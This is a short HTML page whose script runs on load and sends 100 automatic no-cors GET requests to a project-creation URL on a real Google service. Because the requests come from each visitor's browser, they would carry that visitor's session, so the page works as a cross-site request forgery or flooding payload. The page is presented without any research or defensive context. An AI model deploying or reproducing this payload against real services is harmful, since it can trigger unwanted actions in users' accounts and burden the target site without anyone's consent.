<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Auto GET Requests</title>
</head>
<body>
    <h2>Sending GET requests</h2>

    <script>
        const targetUrl = "https://mixboard.google.com/projects/new";

        // Send 100 GET requests automatically
        for (let i = 0; i < 100; i++) {
            fetch(targetUrl, { method: "GET", mode: "no-cors" })
                .catch(err => console.log("Request error:", err));
        }
    </script>
</body>
</html>
